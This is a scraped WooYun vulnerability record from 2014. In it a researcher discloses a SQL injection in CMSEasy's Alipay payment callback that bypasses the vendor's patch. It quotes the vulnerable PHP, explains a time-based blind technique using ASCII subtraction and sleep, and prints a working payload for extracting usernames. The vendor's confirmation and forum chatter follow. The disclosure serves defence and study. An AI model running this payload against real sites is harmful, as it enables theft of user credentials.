{"id": 3572, "wybug_id": "wooyun-2014-053737", "wybug_title": "继续绕过cmseasy补丁继续注入", "wybug_corp": "cmseasy", "wybug_author": "′雨。", "wybug_date": "2014-03-17 11:39", "wybug_open_date": "2014-06-15 11:40", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-03-17：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-03-17：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-03-20：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2014-05-11：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-05-21：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-05-31：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-06-15：\t细节向公众公开  简要描述： 过滤不严。 详细说明：  - - 又来绕过了。官网上又更新了包。 看看是怎么来过滤的lib\\plugins\\pay\\alipay.php\nfunction respond() {        if (!empty($_POST)) {            foreach($_POST as $key =>$data) {                if(preg_match('/(=|<|>|\\')/', $data)){                    return false;                }                $_GET[$key] = $data;            }        }        $payment  = pay::get_payment($_GET['code']);        $seller_email = rawurldecode($_GET['seller_email']);        $order_sn = str_replace($_GET['subject'],'',$_GET['out_trade_no']);        $order_sn = trim($order_sn);        if (!pay::check_money($order_sn,$_GET['total_fee'])) {            return false;        }        if($_GET['trade_status'] == \"WAIT_SELLER_SEND_GOODS\"||$_GET['trade_status'] == \"TRADE_FINISHED\" || $_GET['trade_status'] == \"TRADE_SUCCESS\") {            pay::changeorders($order_sn,$_GET);            return true;        }else {            return false;        }    }}\n可以看到 官方是在正则表达式那里做了修改。添加了\\'  因为全局转义 所以就不能用单引号了。  所以像上次那样绕过就不行了。那就再来找找其他的突破口。\npublic static function changeorders($id,$orderlog) {    \t//file_put_contents('logs.txt', $id);        $where=array();        $where['id']=$id;        $where['status']=4;        //$where['orderlog']=serialize($orderlog);        $update=orders::getInstance()->rec_update($where,$id);\n\nfunction rec_update($row,$where) {        $tbname=$this->name;        $sql=$this->sql_update($tbname,$row,$where);\n\nfunction sql_update($tbname,$row,$where) {        $sqlud='';        if (is_string($row))            $sqlud=$row.' ';        else            foreach ($row as $key=>$value) {                if (in_array($key,explode(',',$this->getcolslist()))) {                    $value=$value;                    if (preg_match('/^\\[(.*)\\]$/',$value,$match))                        $sqlud .= \"`$key`\".\"= \".$match[1].\",\";                    elseif ($value === \"\")                        $sqlud .= \"`$key`= NULL, \";                    else                        $sqlud .= \"`$key`\".\"= '\".$value.\"',\";                }            }        $sqlud=rtrim($sqlud);        $sqlud=rtrim($sqlud,',');        $this->condition($where);        $sql=\"UPDATE `\".$tbname.\"` SET \".$sqlud.\" WHERE \".$where;\n这里可以看到。如果$where 不是数型的话 就没有单引号保护的。 这个有点不太符合我的常识啊。 不是一般数型的才不用单引号保护,字符串才用单引号保护的么?不懂程序猿的世界。但是这里$where 不太好利用 因为过滤掉了= < > 一般是利用where id=user() 之类的来注入 需要自己添加一个等号之类的但是这里过滤掉了= < >。再找找其他的突破口。\nforeach ($row as $key=>$value) {                if (in_array($key,explode(',',$this->getcolslist()))) {                    $value=$value;                    if (preg_match('/^\\[(.*)\\]$/',$value,$match))                        $sqlud .= \"`$key`\".\"= \".$match[1].\",\";                    elseif ($value === \"\")                        $sqlud .= \"`$key`= NULL, \";                    else                        $sqlud .= \"`$key`\".\"= '\".$value.\"',\";                }            }\n可以看到这里 遍历 然后赋值。                     \nelse$sqlud .= \"`$key`\".\"= '\".$value.\"',\";\n这个被单引号保护了 无法利用。 但是这里有一个\nif (preg_match('/^\\[(.*)\\]$/',$value,$match))                        $sqlud .= \"`$key`\".\"= \".$match[1].\",\";\n这里是没有单引号保护的。  只要满足这个匹配 然后就可以无单引号啦。 哟西 好激动。满足这个表达式后 他所执行的语句。UPDATE `cmseasy_p_orders` SET `id`= 123,`status`= '4' WHERE [123]但是过滤了= <>  我也没有什么好的注入办法。我利用的是-号,然后用substr 一位一位的查询 然后对查询出来的结果 ascii 一次然后再-掉一个数字。例如 账户为admin substr 查询出来的第一位为a 然后ascii 后就为97.然后这里就需要写一个脚本来跑了。然后97-xx 只有当xx为97的时候 才不会延时 当为其他的数字的时候都会延时的。Come on baby   漏洞证明：  我直接把语句输出来。\n\n注释掉后面的 相当于就是说 执行的就是UPDATE `cmseasy_p_orders` SET `id`= if(ascii(substr((select username from cmseasy_user),1,1))-96,sleep(1),null)我这substr查询出来的是a 然后ascii 后就为97\n\n可以看到的是 当剪掉的是正确数字的时候 是不会延时的。但是减去其他任意数字的时候 都会延时的。然后 把ascii转回来 就可以得到数据了。这里需要写个脚本跑, 要不很慢啊。   修复方案：  继续过滤。继续求高分。   版权声明：转载请注明来源 ′雨。@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：20  确认时间：2014-03-17 14:14 厂商回复： 感谢 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2014-03-17 12:44 |    \t\t′  雨。 \t\t\t( 普通白帽子  |\t\t\t        Rank:1231 漏洞数:190        | Only Code Never Lie To Me.)\t\t \n  有个函数贴错了。  我说的数型会被单引号。    字符串没单引号应该是condition函数，     \n     2014-03-17 14:03 |    \t\t寂寞的瘦子 \t\t\t( 普通白帽子  |\t\t\t        Rank:242 漏洞数:53        | 一切语言转汇编理论)\t\t \n  @′  雨。 你和你师父掉渣了，少年，前途无量！！    \n     2014-03-17 14:17 |    \t\t′  雨。 \t\t\t( 普通白帽子  |\t\t\t        Rank:1231 漏洞数:190        | Only Code Never Lie To Me.)\t\t \n  @寂寞的瘦子 牛  求交流    \n     2014-03-17 14:32 |    \t\t寂寞的瘦子 \t\t\t( 普通白帽子  |\t\t\t        Rank:242 漏洞数:53        | 一切语言转汇编理论)\t\t \n  @′  雨。 大牛，关注你很久了！私密下我你的联系方式    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 20, "Ranks": null}